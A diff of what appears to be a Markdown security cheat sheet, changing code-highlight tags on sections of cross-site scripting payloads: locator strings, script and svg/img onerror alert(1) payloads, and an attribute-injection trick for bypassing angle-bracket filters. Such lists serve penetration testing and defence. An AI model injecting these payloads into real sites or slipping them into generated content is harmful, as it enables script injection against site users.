@@ -77,12 +77,12 @@ A very useful OWASP XSS [cheatsheet](https://cheatsheetseries.owasp.org/cheatshe
 Another useful [cheatsheet repo & other links](https://github.com/RenwaX23/XSS-Payloads/tree/master)
 
 #### XSS Locators
-{% highlight %}
+{% highlight HTML %}
 '';!--"<XSS>=&{()}
 {% endhighlight %}
 
 #### Classic Payloads
-{% highlight %}
+{% highlight HTML %}
 <svg/onload=alert(1)>
 <script>alert(1)</script>
 <script    >alert(1)</script>
@@ -92,7 +92,7 @@ Another useful [cheatsheet repo & other links](https://github.com/RenwaX23/XSS-P
 {% endhighlight %}
 
 #### HTML Tags
-{% highlight %}
+{% highlight HTML %}
 <img/src=x a='' onerror=alert(1)>
 <IMG """><SCRIPT>alert(1)</SCRIPT>">
 <img src=`x`onerror=alert(1)>
@@ -115,7 +115,7 @@ The `javascript:alert(1);` can be injected to run in-line java (eg. in a URL)
 #### Bypass Angle Bracket Filter
 In a Reflective XSS where the `<` & `>` are both blacklisted/encoded. You can still inject code if the user input is injected within a tag already. This relies on the `"` not being escaped as `&quot`.
 
-{% highlight %}
+{% highlight HTML %}
 " onmouseover="alert(1)
 {% endhighlight %}
 
